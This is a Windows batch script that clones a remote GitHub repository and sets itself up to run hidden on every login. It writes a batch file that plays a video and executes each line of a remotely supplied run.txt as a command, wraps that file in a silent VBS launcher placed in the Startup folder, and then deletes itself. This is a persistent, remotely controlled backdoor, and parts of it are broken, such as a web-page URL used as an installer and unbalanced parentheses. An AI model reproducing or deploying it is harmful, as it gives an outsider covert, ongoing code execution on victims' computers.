@echo off
:: Define paths and URLs
set download_folder=%USERPROFILE%\dd
set github_repo=https://github.com/lkrtgy/hi.git
set local_repo_folder=%download_folder%\hi

:: Create the download folder if it doesn't exist
if not exist "%download_folder%" mkdir "%download_folder%"

:: Check if Git is installed. If not, download and install Git
where git >nul 2>nul
if %errorlevel% neq 0 (
    echo Git not found, installing Git...
    set git_installer_url=https://git-scm.com/download/win
    set git_installer=%TEMP%\GitInstaller.exe
    echo Downloading Git...
    curl -L %git_installer_url% -o "%git_installer%" --silent
    echo Installing Git...
    start /wait "" "%git_installer%" /VERYSILENT
    del "%git_installer%"
)

:: Clone the repository if it doesn't exist, otherwise update it
if not exist "%local_repo_folder%" (
    echo Repository not found, cloning from GitHub...
    git clone %github_repo% "%local_repo_folder%"
) else (
    echo Repository found, checking for updates...
    cd "%local_repo_folder%"
    git pull
)

:: Navigate to the downloaded repo folder
cd "%local_repo_folder%"

:: Copy files from the cloned repository to the target folder
echo Copying files from repository to target folder...
xcopy /s /e /y "%local_repo_folder%\*" "%download_folder%\"

:: Read config file to get video delay and other settings
set config_file=%download_folder%\config.txt
for /f "tokens=1,2 delims==" %%A in ('type "%config_file%"') do (
    if /i "%%A"=="video_delay" set video_delay=%%B
    if /i "%%A"=="disable_touch" set disable_touch=%%B
)

:: Create the download_and_schedule.bat script
echo @echo off > "%download_folder%\download_and_schedule.bat"
echo timeout /t %video_delay% /nobreak >nul >> "%download_folder%\download_and_schedule.bat"
echo start "" "%download_folder%\yourvideo.mp4" >> "%download_folder%\download_and_schedule.bat"

:: Optional: Execute commands from run.txt if it exists
set run_file=%download_folder%\run.txt
if exist "%run_file%" (
    echo if exist "%run_file%" ( >> "%download_folder%\download_and_schedule.bat"
    echo     for /f "usebackq delims=" %%A in ("%run_file%") do ( >> "%download_folder%\download_and_schedule.bat"
    echo         %%A >> "%download_folder%\download_and_schedule.bat"
    echo     ) >> "%download_folder%\download_and_schedule.bat"
)

:: Create run_silently.vbs to execute silently
echo Set objShell = CreateObject("WScript.Shell") > "%download_folder%\run_silently.vbs"
echo objShell.Run "cmd /c ^""%download_folder%\download_and_schedule.bat^""", 0, False >> "%download_folder%\run_silently.vbs"

:: Copy run_silently.vbs to the Startup folder
set startup_folder=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup
copy "%download_folder%\run_silently.vbs" "%startup_folder%\run_silently.vbs" /Y >nul

:: Clean up the installer script by deleting itself
del "%~f0"

